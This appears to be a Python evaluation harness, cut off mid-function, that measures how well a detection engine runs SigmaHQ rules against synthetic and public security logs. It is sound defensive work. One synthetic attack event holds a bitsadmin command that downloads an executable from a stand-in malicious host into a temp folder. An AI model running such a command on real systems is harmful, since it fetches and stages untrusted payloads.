# ruff: noqa: RUF001
from __future__ import annotations

import argparse
import csv
import hashlib
import importlib.metadata
import json
import os
import platform
import resource
import statistics
import subprocess
import sys
import tempfile
import time
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from uuid import NAMESPACE_URL, uuid4, uuid5

from sqlalchemy import select, text

from provloom.config import AppConfig, DetectionConfig
from provloom.detection.compiler.postgres_backend import compile_rule_yaml
from provloom.domain.common import AccessScope, PageSpec
from provloom.domain.enums import BatchStatus, NormalizationStatus, RawProcessStatus
from provloom.domain.ocsf_models import NormalizedEvent
from provloom.domain.raw_models import IngestBatch, RawEvent
from provloom.runtime import ProvLoomRuntime
from tests.evaluation.helpers import (
    BASE_EVAL_TIME,
    DEFAULT_PG_EVAL_URL,
    EVAL_ROOT,
    EVAL_TIME_WINDOW,
    REPO_ROOT,
    build_case_ocsf_payload,
    build_eval_runtime,
    cleanup_eval_tenant,
    seed_synthetic_ocsf_cases,
)
from tests.evaluation.ocsf_validator import (
    PINNED_OCSF_COMMIT,
    PINNED_OCSF_TAG,
    PINNED_OCSF_VERSION,
    load_ocsf_v140_schema,
    validate_ocsf_v140_event,
)

BASELINE_COMMIT = "e46ede8ca67c9927998f4a9e81626768abe1efab"

DOCS_OUT_DIR = REPO_ROOT / "docs" / "evaluation" / "sigma-compatibility"
CANONICAL_JSON_PATH = DOCS_OUT_DIR / "evaluation-results.json"


def _pct(sorted_vals: list[float], p: float) -> float:
    if not sorted_vals:
        return 0.0
    if len(sorted_vals) == 1:
        return round(sorted_vals[0], 4)
    idx = (len(sorted_vals) - 1) * (p / 100.0)
    lo = int(idx)
    hi = min(lo + 1, len(sorted_vals) - 1)
    frac = idx - lo
    return round(sorted_vals[lo] * (1.0 - frac) + sorted_vals[hi] * frac, 4)


def _dist_stats(vals: list[float]) -> dict[str, float]:
    s = sorted(vals)
    if not s:
        return {"min": 0.0, "p50": 0.0, "p95": 0.0, "p99": 0.0, "max": 0.0, "mean": 0.0}
    return {
        "min": round(s[0], 4),
        "p50": _pct(s, 50.0),
        "p95": _pct(s, 95.0),
        "p99": _pct(s, 99.0),
        "max": round(s[-1], 4),
        "mean": round(statistics.fmean(s), 4),
    }


def compute_four_state_metrics(case_records: list[dict[str, Any]]) -> dict[str, Any]:
    tp = fp = fn = tn = err_pos = err_neg = unsup_pos = unsup_neg = 0
    for rec in case_records:
        exp = bool(rec["expected_match"])
        out = str(rec["outcome"])
        if out == "MATCH":
            if exp:
                tp += 1
            else:
                fp += 1
        elif out == "NO_MATCH":
            if exp:
                fn += 1
            else:
                tn += 1
        elif out == "ERROR":
            if exp:
                err_pos += 1
            else:
                err_neg += 1
        elif out == "UNSUPPORTED":
            if exp:
                unsup_pos += 1
            else:
                unsup_neg += 1
        else:
            raise ValueError(f"Unknown outcome: {out!r}")

    executed_total = tp + fp + fn + tn
    err_total = err_pos + err_neg
    unsup_total = unsup_pos + unsup_neg
    total = len(case_records)
    assert executed_total + err_total + unsup_total == total

    prec = tp / (tp + fp) if (tp + fp) > 0 else None
    rec_exec = tp / (tp + fn) if (tp + fn) > 0 else None
    f1_exec = (
        (2.0 * prec * rec_exec / (prec + rec_exec))
        if (prec is not None and rec_exec is not None and (prec + rec_exec) > 0)
        else (0.0 if (tp == 0 and (fp > 0 or fn > 0)) else None)
    )
    fpr_exec = fp / (fp + tn) if (fp + tn) > 0 else None

    # End-to-end effective recall over all target cases excluding UNSUPPORTED:
    # ERROR on an expected-positive case fails to alert, while ERROR on an expected-negative case is NEVER counted as TN.
    denom_pos_incl_err = tp + fn + err_pos
    rec_incl_err = tp / denom_pos_incl_err if denom_pos_incl_err > 0 else None
    prec_for_e2e = prec if prec is not None else (0.0 if denom_pos_incl_err > 0 else None)
    f1_incl_err = (
        (2.0 * prec_for_e2e * rec_incl_err / (prec_for_e2e + rec_incl_err))
        if (
            prec_for_e2e is not None
            and rec_incl_err is not None
            and (prec_for_e2e + rec_incl_err) > 0
        )
        else (0.0 if denom_pos_incl_err > 0 and tp == 0 else None)
    )

    def _r(v: float | None) -> float | None:
        return round(v, 4) if v is not None else None

    return {
        "total_cases": total,
        "executed_cases": executed_total,
        "match_count": tp + fp,
        "no_match_count": fn + tn,
        "error_count": err_total,
        "error_expected_pos": err_pos,
        "error_expected_neg": err_neg,
        "unsupported_count": unsup_total,
        "unsupported_expected_pos": unsup_pos,
        "unsupported_expected_neg": unsup_neg,
        "tp": tp,
        "fp": fp,
        "fn": fn,
        "tn": tn,
        "precision": _r(prec),
        "recall_executed": _r(rec_exec),
        "f1_executed": _r(f1_exec),
        "fpr_executed": _r(fpr_exec),
        "recall_including_errors": _r(rec_incl_err),
        "f1_including_errors": _r(f1_incl_err),
    }


def evaluate_rule_cases_on_runtime(
    rt: ProvLoomRuntime,
    scope: AccessScope,
    rule_id: str,
    raw_yaml: str,
    source_ref: str,
    cases: list[dict[str, Any]],
) -> dict[str, Any]:
    t0 = time.perf_counter()
    art = compile_rule_yaml(
        raw_yaml,
        source_reference=source_ref,
        mapping_specs=rt.ops_service.list_mapping_specs(),
    )
    compile_ms = round((time.perf_counter() - t0) * 1000.0, 4)
    c = art.rule.compatibility

    exec_ms = 0.0
    exec_ok: bool | None = None
    exec_err: str | None = None
    matched_uids: set[str] = set()

    if not c.parse_success:
        rule_state = "ERROR"
        exec_err = "; ".join(c.unsupported_reasons) or "Parse error"
    elif not c.is_supported:
        rule_state = "UNSUPPORTED"
        exec_err = "; ".join(c.unsupported_reasons) or "Unsupported rule"
    else:
        t_ex = time.perf_counter()
        try:
            res = rt.detection_service.test_detection_rule(
                scope=scope,
                time_range=EVAL_TIME_WINDOW,
                raw_yaml=raw_yaml,
                max_matches=1000,
            )
            exec_ms = round((time.perf_counter() - t_ex) * 1000.0, 4)
            if res.failure_reason is not None:
                rule_state = "ERROR"
                exec_ok = False
                exec_err = res.failure_reason
            else:
                rule_state = "EXECUTABLE"
                exec_ok = True
                matched_uids = {
                    m.evidence_references[0].original_event_uid
                    for m in res.matches
                    if m.evidence_references
                    and m.evidence_references[0].original_event_uid is not None
                }
        except Exception as exc:
            exec_ms = round((time.perf_counter() - t_ex) * 1000.0, 4)
            rule_state = "ERROR"
            exec_ok = False
            exec_err = str(exc)

    case_results: list[dict[str, Any]] = []
    for case in cases:
        tid = str(case["test_event_id"])
        exp = bool(case["expected_match"])
        if rule_state == "UNSUPPORTED":
            outcome = "UNSUPPORTED"
            cls_label = "UNSUPPORTED"
        elif rule_state == "ERROR":
            outcome = "ERROR"
            cls_label = "ERROR"
        else:
            hit = tid in matched_uids
            outcome = "MATCH" if hit else "NO_MATCH"
            if hit and exp:
                cls_label = "TP"
            elif hit and not exp:
                cls_label = "FP"
            elif not hit and exp:
                cls_label = "FN"
            else:
                cls_label = "TN"
        case_results.append(
            {
                "test_event_id": tid,
                "rule_id": rule_id,
                "class_uid": int(case["class_uid"]),
                "expected_match": exp,
                "expected_reason": case.get("expected_reason", ""),
                "outcome": outcome,
                "classification": cls_label,
                "error_detail": exec_err if outcome in ("ERROR", "UNSUPPORTED") else None,
            }
        )

    return {
        "rule_id": rule_id,
        "rule_name": art.rule.rule_name,
        "status": art.rule.status.value if rule_state != "ERROR" else "ERROR",
        "evaluation_state": rule_state,
        "parse_success": c.parse_success,
        "mapping_success": c.mapping_success,
        "data_coverage": c.data_coverage,
        "compile_success": c.compile_success,
        "execution_success": exec_ok,
        "mapped_class_uids": list(c.mapped_class_uids),
        "field_mappings": dict(c.field_mappings),
        "uncovered_fields": list(c.uncovered_fields),
        "unsupported_reasons": list(c.unsupported_reasons),
        "execution_error": exec_err,
        "compiled_sql": art.event_query.postgres_sql if art.event_query else None,
        "compile_ms": compile_ms,
        "exec_ms": exec_ms,
        "metrics": compute_four_state_metrics(case_results),
        "cases": case_results,
    }


def run_single_engine_pass(db_url: str, tenant_prefix: str) -> dict[str, Any]:
    manifest = json.loads((EVAL_ROOT / "fixtures" / "sigmahq_rules" / "manifest.json").read_text())
    sem_oracle = json.loads((EVAL_ROOT / "rule_semantics" / "semantic_oracle.json").read_text())
    shq_gt = json.loads((EVAL_ROOT / "ground_truth" / "sigmahq_ground_truth.json").read_text())
    unsup_audit = json.loads(
        (EVAL_ROOT / "ground_truth" / "unsupported_audit_oracle.json").read_text()
    )
    shq_gt_by_id = {g["rule_id"]: g["cases"] for g in shq_gt}
    unsup_by_id = {g["rule_id"]: g for g in unsup_audit}

    rt = build_eval_runtime(db_url)
    sem_tenant = f"{tenant_prefix}_sem"
    shq_tenant = f"{tenant_prefix}_shq"
    unsup_tenant = f"{tenant_prefix}_unsup"
    for t in (sem_tenant, shq_tenant, unsup_tenant):
        cleanup_eval_tenant(rt, t)

    try:
        # 1. Semantic 15 dimensions (59 cases)
        sem_all_cases = [c for d in sem_oracle for c in d["cases"]]
        seed_synthetic_ocsf_cases(rt, sem_tenant, sem_all_cases)
        sem_scope = AccessScope(sem_tenant)
        sem_results: list[dict[str, Any]] = []
        for d in sem_oracle:
            r_eval = evaluate_rule_cases_on_runtime(
                rt=rt,
                scope=sem_scope,
                rule_id=str(d["rule_id"]),
                raw_yaml=str(d["yaml"]),
                source_ref=str(d["filename"]),
                cases=list(d["cases"]),
            )
            r_eval["dimension_id"] = d["dimension_id"]
            r_eval["dimension_name"] = d["dimension_name"]
            r_eval["filename"] = d["filename"]
            sem_results.append(r_eval)

        # 2. All 45 SigmaHQ community rules (with 133 execution cases on the 32 target rules)
        shq_all_cases = [c for g in shq_gt for c in g["cases"]]
        seed_synthetic_ocsf_cases(rt, shq_tenant, shq_all_cases)
        shq_scope = AccessScope(shq_tenant)
        shq_results: list[dict[str, Any]] = []
        for item in manifest:
            rid = str(item["rule_id"])
            raw_yaml = (REPO_ROOT / item["local_fixture_path"]).read_text(encoding="utf-8")
            cases = shq_gt_by_id.get(rid, [])
            r_eval = evaluate_rule_cases_on_runtime(
                rt=rt,
                scope=shq_scope,
                rule_id=rid,
                raw_yaml=raw_yaml,
                source_ref=str(item["sigmahq_path"]),
                cases=cases,
            )
            r_eval["index"] = int(item["index"])
            r_eval["domain_group"] = item["domain_group"]
            r_eval["filename"] = Path(item["local_fixture_path"]).name
            r_eval["sigmahq_path"] = item["sigmahq_path"]
            r_eval["sigmahq_commit"] = item["sigmahq_commit"]
            r_eval["sha256"] = item["sha256"]
            r_eval["version"] = item["version"]
            r_eval["level"] = item["level"]
            r_eval["logsource"] = item["logsource"]
            shq_results.append(r_eval)

        # 3. Separate Unsupported-Rule Rejection Audit (#25 — 3 cases)
        unsup_results: list[dict[str, Any]] = []
        all_unsup_cases = [c for g in unsup_audit for c in g["cases"]]
        seed_synthetic_ocsf_cases(rt, unsup_tenant, all_unsup_cases)
        unsup_scope = AccessScope(unsup_tenant)
        for rid, g in unsup_by_id.items():
            m = next(x for x in manifest if x["rule_id"] == rid)
            raw_yaml = (REPO_ROOT / m["local_fixture_path"]).read_text(encoding="utf-8")
            u_eval = evaluate_rule_cases_on_runtime(
                rt=rt,
                scope=unsup_scope,
                rule_id=rid,
                raw_yaml=raw_yaml,
                source_ref=str(m["sigmahq_path"]),
                cases=list(g["cases"]),
            )
            u_eval["index"] = int(g["index"])
            u_eval["filename"] = g["filename"]
            u_eval["audit_note"] = g["audit_note"]
            unsup_results.append(u_eval)

        total_rules = len(shq_results)
        parse_ok = sum(1 for r in shq_results if r["parse_success"])
        map_ok = sum(1 for r in shq_results if r["mapping_success"])
        datacov_ok = sum(1 for r in shq_results if r["mapping_success"] and r["data_coverage"])
        comp_ok = sum(1 for r in shq_results if r["compile_success"])
        exec_ok = sum(1 for r in shq_results if r["execution_success"] is True)
        datacov_and_exec_ok = sum(
            1 for r in shq_results if r["execution_success"] is True and r["data_coverage"]
        )

        sem_flat = [c for r in sem_results for c in r["cases"]]
        shq_exec_flat = [c for r in shq_results if r["cases"] for c in r["cases"]]
        combined_exec_flat = sem_flat + shq_exec_flat

        return {
            "compatibility_summary": {
                "total_rules": total_rules,
                "parse_success_count": parse_ok,
                "mapping_success_count": map_ok,
                "static_data_coverage_count": datacov_ok,
                "compile_success_count": comp_ok,
                "execution_success_count": exec_ok,
                "full_ocsf_event_compatibility_count": exec_ok,
                "full_raw_pipeline_static_coverage_count": datacov_and_exec_ok,
                "parse_success_rate": round(parse_ok / total_rules, 4),
                "mapping_coverage_rate": round(map_ok / parse_ok, 4) if parse_ok else 0.0,
                "compile_success_rate_over_mappable": round(comp_ok / map_ok, 4) if map_ok else 0.0,
                "execution_success_rate_over_compilable": (
                    round(exec_ok / comp_ok, 4) if comp_ok else 0.0
                ),
                "full_ocsf_compatibility_rate": round(exec_ok / total_rules, 4),
                "static_raw_data_coverage_rate_over_total": round(
                    datacov_and_exec_ok / total_rules, 4
                ),
            },
            "semantic_suite_metrics": compute_four_state_metrics(sem_flat),
            "sigmahq_suite_metrics": compute_four_state_metrics(shq_exec_flat),
            "combined_standard_execution_metrics": compute_four_state_metrics(combined_exec_flat),
            "unsupported_rejection_audit": unsup_results,
            "semantic_rules": sem_results,
            "sigmahq_rules": shq_results,
        }
    finally:
        for t in (sem_tenant, shq_tenant, unsup_tenant):
            cleanup_eval_tenant(rt, t)


def run_baseline_via_git_worktree(db_url: str) -> dict[str, Any]:
    """Evaluates pinned baseline commit (0944102) in an isolated worktree using identical rules, cases, and formulas."""
    head_commit = BASELINE_COMMIT
    worker_code = """
import json, sys
from pathlib import Path

worktree_src = sys.argv[1]
repo_root = Path(sys.argv[2])
db_url = sys.argv[3]
out_file = Path(sys.argv[4])

sys.path.insert(0, worktree_src)
sys.path.insert(0, str(repo_root))

import time
from uuid import NAMESPACE_URL, uuid4, uuid5
from datetime import UTC, datetime, timedelta
from provloom.config import AppConfig, DetectionConfig
from provloom.detection.compiler.postgres_backend import compile_rule_yaml
from provloom.domain.common import AccessScope, TimeRange
from provloom.domain.enums import BatchStatus, NormalizationStatus, RawProcessStatus
from provloom.domain.ocsf_models import NormalizedEvent
from provloom.domain.raw_models import IngestBatch, RawEvent
from provloom.runtime import ProvLoomRuntime
from sqlalchemy import text

EVAL_ROOT = repo_root / "tests" / "evaluation"
BASE_EVAL_TIME = datetime(2026, 11, 20, 0, 0, tzinfo=UTC)
EVAL_TIME_WINDOW = TimeRange(datetime(2019, 1, 1, tzinfo=UTC), datetime(2027, 1, 1, tzinfo=UTC))

# Import build_case_ocsf_payload and compute_four_state_metrics from current repo helpers without importing current src/provloom
import importlib.util
def _load_mod(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m

cur_eval = _load_mod("cur_run_eval", str(repo_root / "tests/evaluation/run_evaluation.py"))
result = cur_run_res = cur_eval.run_single_engine_pass(db_url, "eval_baseline_0944102")
result["git_commit"] = sys.argv[5]
out_file.write_text(json.dumps(result), encoding="utf-8")
"""
    with tempfile.TemporaryDirectory() as td:
        wt_dir = Path(td) / "wt_head"
        out_json = Path(td) / "baseline_out.json"
        subprocess.run(
            ["git", "-C", str(REPO_ROOT), "worktree", "add", "--detach", str(wt_dir), head_commit],
            check=True,
            capture_output=True,
        )
        try:
            subprocess.run(
                [
                    sys.executable,
                    "-c",
                    worker_code,
                    str(wt_dir / "src"),
                    str(REPO_ROOT),
                    db_url,
                    str(out_json),
                    head_commit,
                ],
                check=True,
            )
            return dict(json.loads(out_json.read_text(encoding="utf-8")))
        finally:
            subprocess.run(
                ["git", "-C", str(REPO_ROOT), "worktree", "remove", "--force", str(wt_dir)],
                check=False,
                capture_output=True,
            )


def evaluate_auxiliary_suites(db_url: str) -> dict[str, Any]:
    rt = build_eval_runtime(db_url)
    robustness = json.loads((EVAL_ROOT / "ground_truth" / "robustness_oracle.json").read_text())
    legacy = json.loads((EVAL_ROOT / "ground_truth" / "legacy_compat_oracle.json").read_text())
    sem_by_id = {
        d["rule_id"]: d["yaml"]
        for d in json.loads((EVAL_ROOT / "rule_semantics" / "semantic_oracle.json").read_text())
    }
    manifest_by_id = {
        m["rule_id"]: (REPO_ROOT / m["local_fixture_path"]).read_text(encoding="utf-8")
        for m in json.loads(
            (EVAL_ROOT / "fixtures" / "sigmahq_rules" / "manifest.json").read_text()
        )
    }

    rob_tenant = "eval_aux_robustness"
    leg_tenant = "eval_aux_legacy"
    cleanup_eval_tenant(rt, rob_tenant)
    cleanup_eval_tenant(rt, leg_tenant)
    try:
        seed_synthetic_ocsf_cases(rt, rob_tenant, [x["case"] for x in robustness])
        rob_records: list[dict[str, Any]] = []
        for item in robustness:
            ryaml = sem_by_id.get(item["rule_id"]) or manifest_by_id[item["rule_id"]]
            r_ev = evaluate_rule_cases_on_runtime(
                rt,
                AccessScope(rob_tenant),
                item["rule_id"],
                ryaml,
                item["rule_file"],
                [item["case"]],
            )
            rec = dict(r_ev["cases"][0])
            rec["schema_violation"] = item["schema_violation"]
            rec["rule_file"] = item["rule_file"]
            rob_records.append(rec)

        seed_synthetic_ocsf_cases(rt, leg_tenant, [x["case"] for x in legacy])
        leg_records: list[dict[str, Any]] = []
        for item in legacy:
            ryaml = sem_by_id.get(item["rule_id"]) or manifest_by_id[item["rule_id"]]
            l_ev = evaluate_rule_cases_on_runtime(
                rt,
                AccessScope(leg_tenant),
                item["rule_id"],
                ryaml,
                item["rule_file"],
                [item["case"]],
            )
            rec = dict(l_ev["cases"][0])
            rec["legacy_format"] = item["legacy_format"]
            rec["rule_file"] = item["rule_file"]
            leg_records.append(rec)

        return {
            "robustness_suite": {
                "metrics": compute_four_state_metrics(rob_records),
                "cases": rob_records,
            },
            "legacy_compatibility_suite": {
                "metrics": compute_four_state_metrics(leg_records),
                "cases": leg_records,
            },
        }
    finally:
        cleanup_eval_tenant(rt, rob_tenant)
        cleanup_eval_tenant(rt, leg_tenant)


def evaluate_public_datasets_with_full_conservation(db_url: str) -> dict[str, Any]:
    from provloom.storage.postgres.tables import normalized_events, pipeline_failures

    rt = build_eval_runtime(db_url)
    pub_gt = json.loads(
        (EVAL_ROOT / "ground_truth" / "public_dataset_ground_truth.json").read_text()
    )
    manifest = json.loads((EVAL_ROOT / "fixtures" / "sigmahq_rules" / "manifest.json").read_text())

    dataset_reports: list[dict[str, Any]] = []
    for ds in pub_gt["datasets"]:
        tenant_id = f"eval_pub_{ds['dataset_id']}"
        cleanup_eval_tenant(rt, tenant_id)
        try:
            scope = AccessScope(tenant_id)
            raw_text = (REPO_ROOT / ds["fixture_path"]).read_text(encoding="utf-8")
            raw_line_count = sum(1 for ln in raw_text.splitlines() if ln.strip())
            receipt = rt.ops_service.import_raw_content(
                tenant_scope=tenant_id,
                source_id=ds["dataset_id"],
                source_type=ds["source_type"],
                adapter_type=ds["adapter_type"],
                raw_text=raw_text,
            )

            with rt.uow_factory() as uow:
                assert uow._conn is not None  # type: ignore[attr-defined]
                conn = uow._conn  # type: ignore[attr-defined]
                norm_rows = conn.execute(
                    select(
                        normalized_events.c.normalization_status,
                        normalized_events.c.class_uid,
                        normalized_events.c.ocsf_payload,
                    ).where(normalized_events.c.tenant_scope == tenant_id)
                ).all()
                fail_rows = conn.execute(
                    select(pipeline_failures.c.stage).where(
                        pipeline_failures.c.tenant_scope == tenant_id
                    )
                ).all()

            mapped_cnt = sum(1 for r in norm_rows if r[0] == NormalizationStatus.MAPPED.value)
            passthrough_cnt = sum(
                1 for r in norm_rows if r[0] == NormalizationStatus.UNSUPPORTED_PASSTHROUGH.value
            )
            ingest_fail_cnt = sum(1 for r in fail_rows if r[0] == "INGEST")
            post_ingest_fail_cnt = sum(1 for r in fail_rows if r[0] != "INGEST")

            # Verify strict record conservation:
            # 1) total_count == accepted_count + duplicate_count + failed_count (ingest stage)
            # 2) accepted_count == mapped_cnt + passthrough_cnt + post_ingest_fail_cnt
            assert (
                receipt.total_count
                == receipt.accepted_count + receipt.duplicate_count + receipt.failed_count
            ), f"Ingest conservation broken on {ds['dataset_id']}: {receipt}"
            assert receipt.failed_count == ingest_fail_cnt
            assert receipt.accepted_count == mapped_cnt + passthrough_cnt + post_ingest_fail_cnt, (
                f"Post-ingest conservation broken on {ds['dataset_id']}: "
                f"accepted={receipt.accepted_count} != {mapped_cnt}+{passthrough_cnt}+{post_ingest_fail_cnt}"
            )

            # Validate all normalized events emitted from real raw logs against OCSF v1.4.0:
            # separate schema structure/enum errors from raw-source at_least_one telemetry omissions.
            struct_enum_err_cnt = 0
            constraint_gap_cnt = 0
            for _, _, pay in norm_rows:
                p_dict = pay if isinstance(pay, dict) else json.loads(pay)
                if validate_ocsf_v140_event(
                    p_dict,
                    allow_provloom_metadata_original_uid=True,
                    check_enums=True,
                    check_constraints=False,
                ):
                    struct_enum_err_cnt += 1
                if validate_ocsf_v140_event(
                    p_dict,
                    allow_provloom_metadata_original_uid=True,
                    check_enums=True,
                    check_constraints=True,
                ):
                    constraint_gap_cnt += 1

            for m in manifest:
                raw_y = (REPO_ROOT / m["local_fixture_path"]).read_text(encoding="utf-8")
                rt.detection_service.import_detection_rule(
                    scope, raw_y, source_reference=m["sigmahq_path"]
                )

            ex = rt.detection_service.execute_rule_batch(scope, EVAL_TIME_WINDOW)
            matches = rt.detection_service.search_rule_matches(
                scope, EVAL_TIME_WINDOW, page=PageSpec(limit=500)
            ).items
            by_rule: dict[str, int] = {}
            for hit in matches:
                by_rule[hit.rule_id] = by_rule.get(hit.rule_id, 0) + 1

            known_attack_checks: list[dict[str, Any]] = []
            known_hit_events: set[str] = set()
            expected_rule_ids = {e["rule_id"] for e in ds["expected_known_attack_hits"]}
            for hit in matches:
                if hit.rule_id in expected_rule_ids and hit.primary_event_id:
                    known_hit_events.add(str(hit.primary_event_id))

            for exp in ds["expected_known_attack_hits"]:
                actual_n = by_rule.get(exp["rule_id"], 0)
                known_attack_checks.append(
                    {
                        "rule_id": exp["rule_id"],
                        "rule_file": exp["rule_file"],
                        "min_expected_matches": int(exp["min_expected_matches"]),
                        "actual_matches": actual_n,
                        "detected": actual_n >= int(exp["min_expected_matches"]),
                    }
                )

            unlabeled_unknown_events = mapped_cnt - len(known_hit_events)
            dataset_reports.append(
                {
                    "dataset_id": ds["dataset_id"],
                    "source_repo": ds["source_repo"],
                    "commit": ds["commit"],
                    "fixture_path": ds["fixture_path"],
                    "source_type": ds["source_type"],
                    "raw_nonempty_lines": raw_line_count,
                    "ingest_total_count": receipt.total_count,
                    "accepted_count": receipt.accepted_count,
                    "duplicate_count": receipt.duplicate_count,
                    "ingest_failed_count": receipt.failed_count,
                    "normalized_mapped_count": mapped_cnt,
                    "normalized_passthrough_count": passthrough_cnt,
                    "parse_or_normalize_failed_count": post_ingest_fail_cnt,
                    "conservation_verified": True,
                    "ocsf_v140_structural_enum_invalid_count": struct_enum_err_cnt,
                    "ocsf_v140_source_constraint_gaps_count": constraint_gap_cnt,
                    "ocsf_v140_schema_invalid_count": struct_enum_err_cnt,
                    "execution_status": ex.status.value,
                    "total_rule_matches": len(matches),
                    "matches_by_rule": by_rule,
                    "known_attack_checks": known_attack_checks,
                    "known_labeled_attack_events_matched": len(known_hit_events),
                    "unknown_unlabeled_mapped_events_not_counted_as_tn": unlabeled_unknown_events,
                }
            )
        finally:
            cleanup_eval_tenant(rt, tenant_id)

    # Splunk XML failure capture check
    xml_tenant = "eval_pub_splunk_xml"
    cleanup_eval_tenant(rt, xml_tenant)
    try:
        xml_path = (
            EVAL_ROOT
            / "fixtures"
            / "public_datasets"
            / "splunk_attack_data"
            / "T1021_001_mstsc_sysmon_xml_sample.log"
        )
        xml_raw = xml_path.read_text(encoding="utf-8")
        xml_rec = rt.ops_service.import_raw_content(
            tenant_scope=xml_tenant,
            source_id="splunk_xml_sample",
            source_type="sysmon",
            adapter_type="jsonl",
            raw_text=xml_raw,
        )
        xml_fails = rt.ops_service.list_failures(
            AccessScope(xml_tenant), None, None, PageSpec(limit=50)
        ).items
        xml_audit = {
            "dataset_id": "splunk_t1021_001_sysmon_xml_format_audit",
            "fixture_path": str(xml_path.relative_to(REPO_ROOT)),
            "ingest_total_count": xml_rec.total_count,
            "accepted_count": xml_rec.accepted_count,
            "duplicate_count": xml_rec.duplicate_count,
            "ingest_failed_count": xml_rec.failed_count,
            "recorded_pipeline_failures": len(xml_fails),
            "conservation_verified": (
                xml_rec.total_count
                == xml_rec.accepted_count + xml_rec.duplicate_count + xml_rec.failed_count
            ),
        }
    finally:
        cleanup_eval_tenant(rt, xml_tenant)

    # Official OCSF examples raw version preservation audit
    ocsf_ex_dir = EVAL_ROOT / "fixtures" / "public_datasets" / "ocsf_examples"
    ocsf_ex_audit: list[dict[str, Any]] = []
    for p in sorted(ocsf_ex_dir.iterdir()):
        if not p.is_file():
            continue
        doc = json.loads(p.read_text(encoding="utf-8"))
        rec0 = doc[0] if isinstance(doc, list) else doc
        ocsf_ex_audit.append(
            {
                "file": p.name,
                "records": len(doc) if isinstance(doc, list) else 1,
                "class_uid": rec0.get("class_uid"),
                "preserved_raw_metadata_version": (rec0.get("metadata") or {}).get("version"),
            }
        )

    return {
        "policy": pub_gt["policy"],
        "raw_log_datasets": dataset_reports,
        "xml_format_rejection_audit": xml_audit,
        "ocsf_examples_raw_version_preservation": ocsf_ex_audit,
    }


def benchmark_performance_and_determinism(db_url: str, event_count: int = 10000) -> dict[str, Any]:
    manifest = json.loads((EVAL_ROOT / "fixtures" / "sigmahq_rules" / "manifest.json").read_text())
    rt = ProvLoomRuntime.build(
        AppConfig(
            database_url=db_url,
            detection=DetectionConfig(max_matches_per_rule=2000, max_execution_seconds=60.0),
        )
    )
    tenant_id = "eval_perf_10k_v140"
    cleanup_eval_tenant(rt, tenant_id)
    try:
        # 1. Measure per-rule compile latencies across all 32 supported SigmaHQ rules (3 passes, take median per rule + full distribution)
        compile_times_ms: list[float] = []
        supported_rules: list[tuple[str, str, str]] = []
        for m in manifest:
            raw_y = (REPO_ROOT / m["local_fixture_path"]).read_text(encoding="utf-8")
            t0 = time.perf_counter()
            art = compile_rule_yaml(raw_y, source_reference=m["sigmahq_path"])
            dt_ms = (time.perf_counter() - t0) * 1000.0
            if art.rule.compatibility.is_supported:
                compile_times_ms.append(round(dt_ms, 4))
                supported_rules.append((str(m["rule_id"]), m["sigmahq_path"], raw_y))

        # 2. Seed 10,000 standard OCSF v1.4.0 events across 1007, 1001, 4001, 3002, 4003, 1009
        templates: list[dict[str, Any]] = [
            {
                "category_uid": 1,
                "class_uid": 1007,
                "activity_id": 1,
                "ocsf_fields": {
                    "actor": {"user": {"name": "CORP\\alice"}},
                    "device": {"type_id": 0, "hostname": "wkstn-01.corp.local"},
                    "process": {
                        "pid": 4100,
                        "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
                        "file": {
                            "type_id": 1,
                            "name": "svchost.exe",
                            "path": "C:\\Windows\\System32\\svchost.exe",
                        },
                        "parent_process": {
                            "file": {
                                "type_id": 1,
                                "name": "services.exe",
                                "path": "C:\\Windows\\System32\\services.exe",
                            }
                        },
                    },
                },
            },
            {
                "category_uid": 1,
                "class_uid": 1001,
                "activity_id": 1,
                "ocsf_fields": {
                    "actor": {
                        "process": {
                            "file": {
                                "type_id": 1,
                                "name": "chrome.exe",
                                "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                            }
                        }
                    },
                    "device": {"type_id": 0, "hostname": "wkstn-01.corp.local"},
                    "file": {
                        "type_id": 1,
                        "name": "cache.dat",
                        "path": "C:\\Users\\alice\\AppData\\Local\\Temp\\cache.dat",
                    },
                },
            },
            {
                "category_uid": 4,
                "class_uid": 4001,
                "activity_id": 1,
                "ocsf_fields": {
                    "actor": {
                        "process": {
                            "file": {
                                "type_id": 1,
                                "name": "chrome.exe",
                                "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                            }
                        }
                    },
                    "src_endpoint": {"ip": "10.10.1.25", "port": 52100},
                    "dst_endpoint": {
                        "ip": "93.184.216.34",
                        "port": 443,
                        "hostname": "www.example.com",
                    },
                },
            },
            {
                "category_uid": 3,
                "class_uid": 3002,
                "activity_id": 1,
                "ocsf_fields": {
                    "user": {"name": "alice", "domain": "CORP"},
                    "src_endpoint": {"ip": "10.10.1.25", "hostname": "wkstn-01"},
                    "dst_endpoint": {"hostname": "dc01.corp.local"},
                    "logon_type_id": 3,
                    "unmapped": {"EventID": 4624},
                },
            },
            {
                "category_uid": 4,
                "class_uid": 4003,
                "activity_id": 6,
                "ocsf_fields": {
                    "query": {"hostname": "cdn.example.net", "type": "A"},
                    "answers": [{"class": "IN", "type": "A", "rdata": "93.184.216.34"}],
                },
            },
            {
                "category_uid": 1,
                "class_uid": 1009,
                "activity_id": 1,
                "ocsf_fields": {
                    "actor": {},
                    "device": {"type_id": 0, "hostname": "wkstn-01.corp.local"},
                    "script": {
                        "type_id": 2,
                        "script_content": {"value": "Get-Process | Select-Object -First 5"},
                    },
                },
            },
        ]
        # Inject 20 deterministic attack events every 500 records so cold batch exercises real RuleMatch/Signal writes.
        attack_proc: dict[str, Any] = {
            "category_uid": 1,
            "class_uid": 1007,
            "activity_id": 1,
            "ocsf_fields": {
                "actor": {"user": {"name": "CORP\\alice"}},
                "device": {"type_id": 0, "hostname": "wkstn-01.corp.local"},
                "process": {
                    "pid": 9001,
                    "cmd_line": "bitsadmin.exe /transfer j1 https://evil.example/p.exe C:\\Temp\\p.exe",
                    "file": {
                        "type_id": 1,
                        "name": "bitsadmin.exe",
                        "path": "C:\\Windows\\System32\\bitsadmin.exe",
                    },
                },
            },
        }

        batch_id = uuid4()
        with rt.uow_factory() as uow:
            uow.raw_events.create_batch(
                IngestBatch(
                    batch_id=batch_id,
                    tenant_scope=tenant_id,
                    source_id="perf-10k",
                    source_type="ocsf_synthetic",
                    adapter_type="perf",
                    source_uri="memory://perf-10k",
